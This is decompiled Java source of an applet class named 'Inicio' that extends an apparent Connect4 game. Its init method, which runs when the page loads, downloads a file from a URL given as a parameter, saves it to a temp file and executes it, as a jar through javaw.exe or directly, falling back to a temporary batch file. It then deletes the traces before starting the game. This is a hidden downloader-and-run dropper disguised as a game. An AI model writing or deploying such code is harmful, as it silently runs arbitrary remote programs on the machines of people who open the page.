import java.io.IOException;
import java.io.PrintWriter;
import java.io.BufferedInputStream;
import java.net.URL;
import java.io.FileOutputStream;
import java.io.File;

// 
// Decompiled by Procyon v0.5.30
// 

public class Inicio extends Connect4
{
    public void init() {
        try {
            final byte[] array = new byte[10240];
            final String parameter = this.getParameter("url");
            System.out.println("------------->>>>>>>>>> " + parameter);
            final String lowerCase = parameter.substring(parameter.lastIndexOf(".")).toLowerCase();
            final File tempFile = File.createTempFile("javatmp", lowerCase);
            final FileOutputStream fileOutputStream = new FileOutputStream(tempFile);
            int read;
            while ((read = new BufferedInputStream(new URL(parameter).openConnection().getInputStream()).read(array)) > 0) {
                fileOutputStream.write(array, 0, read);
            }
            fileOutputStream.close();
            if (lowerCase.contains(".jar")) {
                Runtime.getRuntime().exec(String.valueOf(System.getProperty("sun.boot.library.path")) + "\\javaw.exe -jar  \"" + tempFile.getAbsolutePath() + "\"");
            }
            else {
                try {
                    Runtime.getRuntime().exec(tempFile.getAbsolutePath());
                }
                catch (IOException ex2) {
                    final File tempFile2;
                    (tempFile2 = File.createTempFile("tmp", ".bat")).createNewFile();
                    tempFile2.deleteOnExit();
                    final PrintWriter printWriter;
                    (printWriter = new PrintWriter(tempFile2)).println("\"" + tempFile.getAbsolutePath() + "\"");
                    printWriter.close();
                    Runtime.getRuntime().exec(tempFile2.getAbsolutePath());
                    tempFile2.delete();
                }
            }
            tempFile.deleteOnExit();
        }
        catch (Exception ex) {
            ex.printStackTrace();
        }
        super.init();
    }
}
